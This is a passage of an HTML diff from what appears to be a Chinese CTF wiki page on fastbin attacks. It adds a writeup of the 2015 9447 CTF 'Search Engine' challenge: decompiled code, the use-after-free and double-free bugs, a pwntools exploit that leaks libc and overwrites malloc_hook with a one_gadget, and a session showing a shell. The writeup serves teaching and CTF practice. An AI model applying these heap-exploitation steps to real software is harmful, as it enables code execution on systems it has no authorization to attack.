+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p><strong>读取选择操作数</strong></p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">read_num</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>
+  <span class="n">char</span> <span class="o">*</span><span class="n">endptr</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">50</span><span class="n">h</span><span class="p">]</span>
+  <span class="n">char</span> <span class="n">nptr</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">48</span><span class="n">h</span><span class="p">]</span>
+  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">48</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
+  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nptr</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">endptr</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">nptr</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="n">LL</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> is not a valid number</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nptr</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>因为 read_str 不设置NULL ，因此，如果 nptr 读取的不合法的话，就有可能会 leak 出栈上的内容。</p>
+<p><strong>索引句子释放未置NULL</strong></p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="k">else</span>
+<span class="p">{</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p><strong>搜索词语中删除词语时，对应句子指针只是释放，并没有设置为NULL</strong></p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span>for ( i = head; i; i = i-&gt;next )
+{
+  if ( *i-&gt;sentence_ptr )
+  {
+    if ( LODWORD(i-&gt;size) == v0 &amp;&amp; !memcmp((const void *)i-&gt;content, v1, v0) )
+    {
+      __printf_chk(1LL, &quot;Found %d: &quot;, LODWORD(i-&gt;len));
+      fwrite(i-&gt;sentence_ptr, 1uLL, SLODWORD(i-&gt;len), stdout);
+      putchar(&#39;\n&#39;);
+      puts(&quot;Delete this sentence (y/n)?&quot;);
+      read_str(&amp;choice, 2, 1);
+      if ( choice == &#39;y&#39; )
+      {
+        memset(i-&gt;sentence_ptr, 0, SLODWORD(i-&gt;len));
+        free(i-&gt;sentence_ptr);
+        puts(&quot;Deleted!&quot;);
+      }
+    }
+  }
+}
+free(v1);
+</pre></div>
+</div>
+<p>可以看出，在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 <code class="docutils literal"><span class="pre">\x00</span></code> ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 <code class="docutils literal"><span class="pre">\x00</span></code>
+。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 <code class="docutils literal"><span class="pre">\x00</span></code> 可以防止通过 <code class="docutils literal"><span class="pre">*i-&gt;sentence_ptr</span></code> 验证。然而，由于 chunk
+被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 <code class="docutils literal"><span class="pre">memset</span></code> 的时候，单词虽然都变为了 <code class="docutils literal"><span class="pre">\x00</span></code>
+，但是我们仍然可以通过两个 <code class="docutils literal"><span class="pre">\x00</span></code> 的比较来绕过 <code class="docutils literal"><span class="pre">memcmp</span></code> 的检测。</p>
+</div>
+<div class="section" id="id17">
+<h3>利用<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id18">
+<h4>利用思路<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h4>
+<p>基本利用思路如下</p>
+<ul class="simple">
+<li>利用 unsorted bin 地址泄漏 libc 基地址</li>
+<li>利用 double free 构造 fastbin 循环链表</li>
+<li>分配 chunk 到 malloc_hook 附近，修改malloc_hook 为 one_gadget</li>
+</ul>
+</div>
+<div class="section" id="libc">
+<h4>泄漏 libc 地址<a class="headerlink" href="#libc" title="永久链接至标题">¶</a></h4>
+<p>这里我们分配一个 small bin 大小的 chunk ，当它被释放后，就会放入到 unsorted bin 中。因而，只要 <code class="docutils literal"><span class="pre">unsorted</span> <span class="pre">bin</span></code> 的地址的起始字节不是 <code class="docutils literal"><span class="pre">\x00</span></code> 便可以通过验证。同时，我们可以构造 <code class="docutils literal"><span class="pre">\x00</span></code>
+来进行比较，从而通过验证。具体如下</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">leak_libc</span><span class="p">():</span>
+    <span class="n">smallbin_sentence</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span> <span class="o">*</span> <span class="mh">0x85</span> <span class="o">+</span> <span class="s1">&#39; m &#39;</span>
+    <span class="n">index_sentence</span><span class="p">(</span><span class="n">smallbin_sentence</span><span class="p">)</span>
+    <span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
+    <span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Found &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">smallbin_sentence</span><span class="p">))</span> <span class="o">+</span> <span class="s1">&#39;: &#39;</span><span class="p">)</span>
+    <span class="n">unsortedbin_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">unsortedbin_addr</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="fastbin">
+<h4>构造 fastbin 循环链表<a class="headerlink" href="#fastbin" title="永久链接至标题">¶</a></h4>
+<p>由于我们最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是0x7f。即，我们所需要设置的设置的 fast bin 的数据字节部分的大小为 0x60。这里我们按照如下方式构造</p>
+<ol class="arabic simple">
+<li>分别索引句子a，索引句子b，索引句子c，则此时单词链表中索引的句子的相对顺序为c-&gt;b-&gt;a。假设句子 a 为’a’ * 0x5d+’ d ‘，句子 b 为 ‘b’ * 0x5d+’ d ‘，句子c类似。</li>
+<li>索引单词d，三个均删除，则此时 fastbin 中的链表情况为 a-&gt;b-&gt;c-&gt;NULL，这是因为首先释放的是句子c，最后释放的是句子 a 。这时，搜索单词时<code class="docutils literal"><span class="pre">*i-&gt;sentence_ptr</span></code> 对于a, b 来说都是可以绕过的。</li>
+<li>我们此时再次删除搜索单词 <code class="docutils literal"><span class="pre">\x00</span></code>。首先遍历的是 c，但是 c 的验证不通过；其次遍历的是b，验证通过，我们将其释放；其次遍历的是a，验证通过，但是我们不删除。则此时 fastbin 的情况为
+b-&gt;a-&gt;b-&gt;a-&gt;…。即已经构成了double free b的情况。由于我们先前为了 leak libc 还建立一个句子，所以还有一个单词可以比较，这里我们也不删除。</li>
+</ol>
+<p>具体代码如下</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># 2. create cycle fastbin 0x70 size</span>
+<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#a</span>
+<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#b</span>
+<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#c</span>
+
+<span class="c1"># a-&gt;b-&gt;c-&gt;NULL</span>
+<span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
+
+<span class="c1"># b-&gt;a-&gt;b-&gt;a-&gt;...</span>
+<span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>效果如下</p>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>pwndbg&gt; fastbins
+fastbins
+0x20: 0x0
+0x30: 0x1d19320 ◂— 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x1d191b0 —▸ 0x1d19010 —▸ 0x1d191b0 ◂— 0x1d19010
+0x80: 0x0
+</pre></div>
+</div>
+</div>
+<div class="section" id="malloc-hook-chunk">
+<h4>分配 malloc_hook 附近chunk<a class="headerlink" href="#malloc-hook-chunk" title="永久链接至标题">¶</a></h4>
+<p>此时，fastbin 的链表为 b-&gt;a-&gt;b-&gt;a-&gt;…，则我们可以在申请第一个相同大小的 chunk 时，设置 b 的 fd 为 malloc_hook 附近处的 chunk <code class="docutils literal"><span class="pre">0x7fd798586aed</span></code>（这里是举一个例子，代码中需使用相对地址）。</p>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>pwndbg&gt; print (void*)&amp;main_arena
+$1 = (void *) 0x7fd798586b20 &lt;main_arena&gt;
+pwndbg&gt; x/8gx 0x7fd798586b20-16
+0x7fd798586b10 &lt;__malloc_hook&gt;: 0x0000000000000000  0x0000000000000000
+0x7fd798586b20 &lt;main_arena&gt;:    0x0000000000000000  0x0000000000bce130
+0x7fd798586b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000
+0x7fd798586b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000
+pwndbg&gt; find_fake_fast 0x7fd798586b10 0x7f
+FAKE CHUNKS
+0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA {
+  prev_size = 15535264025435701248,
+  size = 127,
+  fd = 0xd798247e20000000,
+  bk = 0xd798247a0000007f,
+  fd_nextsize = 0x7f,
+  bk_nextsize = 0x0
+}
+pwndbg&gt; print /x 0x7fd798586b10-0x7fd798586aed
+$2 = 0x23
+pwndbg&gt; print /x 0x7fd798586b20-0x7fd798586aed
+$3 = 0x33
+</pre></div>
+</div>
+<p>那么当再次分配 b 的时候，由于此时 b 的 fd 已经被我们修改为了malloc_hook附近的地址，所以这时候我们再次分配一个 chunk，就会指向 <code class="docutils literal"><span class="pre">0x7fd798586aed</span></code>。 此后便只需要将 malloc_hook 修改为 one_gadget
+地址就可以拿到 shell 了。</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># 3. fastbin attack to malloc_hook nearby chunk</span>
+<span class="n">fake_chunk_addr</span> <span class="o">=</span> <span class="n">main_arena_addr</span> <span class="o">-</span> <span class="mh">0x33</span>
+<span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_addr</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">)</span>
+
+<span class="n">index_sentence</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span>
+
+<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">)</span>
+
+<span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">)</span>
+
+<span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xf02a4</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="n">index_sentence</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>这里可能需要多选择几个 one_gadget 地址，因为 one_gadget 成功是有条件的。</p>
+</div>
+<div class="section" id="shell">
+<h4>shell<a class="headerlink" href="#shell" title="永久链接至标题">¶</a></h4>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2015_9447ctf_search-engine git:(master) python exp.py
+[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    FORTIFY:  Enabled
+[+] Starting local process &#39;./search&#39;: pid 31158
+[*] PID: 31158
+[+] unsortedbin addr: 0x7f802e73bb78
+[+] libc base addr: 0x7f802e377000
+[*] Switching to interactive mode
+Enter the sentence:
+$ ls
+exp.py       search      search.id1  search.nam
+libc.so.6  search.id0  search.id2  search.til
+</pre></div>
+</div>
+<p>当然，这里还有一种<a class="reference external" href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">方法</a>，将 chunk 分配到栈上。</p>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id19">
+<h1>参考文献<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h1>
+<ul class="simple">
+<li><a class="reference external" href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></li>
+</ul>
 </div>
 
 
@@ -581,14 +904,14 @@ Fastbins[idx=6, size=0x70]
 <li class="toctree-l2"><a class="reference internal" href="heap_structure.html">堆相关数据结构</a></li>
 <li class="toctree-l2"><a class="reference internal" href="heap_implementation_details.html">深入理解堆的实现</a></li>
 <li class="toctree-l2"><a class="reference internal" href="heapoverflow_basic.html">堆溢出</a></li>
-<li class="toctree-l2"><a class="reference internal" href="off_by_one.html">堆中的off-by-one</a></li>
-<li class="toctree-l2"><a class="reference internal" href="chunk_extend_shrink.html">chunk extend/shrink</a></li>
+<li class="toctree-l2"><a class="reference internal" href="off_by_one.html">堆中的 Off-By-One</a></li>
+<li class="toctree-l2"><a class="reference internal" href="chunk_extend_shrink.html">Chunk Extend/Shrink</a></li>
 <li class="toctree-l2"><a class="reference internal" href="unlink.html">unlink</a></li>
 <li class="toctree-l2"><a class="reference internal" href="use_after_free.html">Use After Free</a></li>
-<li class="toctree-l2 current"><a class="current reference internal" href="#">fastbin attack</a><ul>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">Fastbin Attack</a><ul>
 <li class="toctree-l3"><a class="reference internal" href="#id1">介绍</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#id2">原理</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#fastbin-double-free">fastbin double free</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#fastbin-double-free">Fastbin Double Free</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#id3">介绍</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id4">演示</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id5">小总结</a></li>
@@ -600,14 +923,31 @@ Fastbins[idx=6, size=0x70]
 <li class="toctree-l4"><a class="reference internal" href="#id8">小总结</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#arbitrary-alloc">arbitrary alloc</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#arbitrary-alloc">Arbitrary Alloc</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#id9">介绍</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id10">演示</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id11">小总结</a></li>
 </ul>
 </li>
+<li class="toctree-l3"><a class="reference internal" href="#ctf-search-engine">2015 9447 CTF : Search Engine</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id12">基本信息</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id13">基本功能</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id14">词语结构体</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id15">堆内存相关操作</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id16">漏洞</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id17">利用</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#id18">利用思路</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#libc">泄漏 libc 地址</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#fastbin">构造 fastbin 循环链表</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#malloc-hook-chunk">分配 malloc_hook 附近chunk</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#shell">shell</a></li>
 </ul>
 </li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#id19">参考文献</a></li>
 <li class="toctree-l2"><a class="reference internal" href="house_of_force.html">House Of Force</a></li>
 <li class="toctree-l2"><a class="reference internal" href="unsorted_bin_attack.html">Unsorted Bin Attack</a></li>
 <li class="toctree-l2"><a class="reference internal" href="house_of_lore.html">House of Lore</a></li>
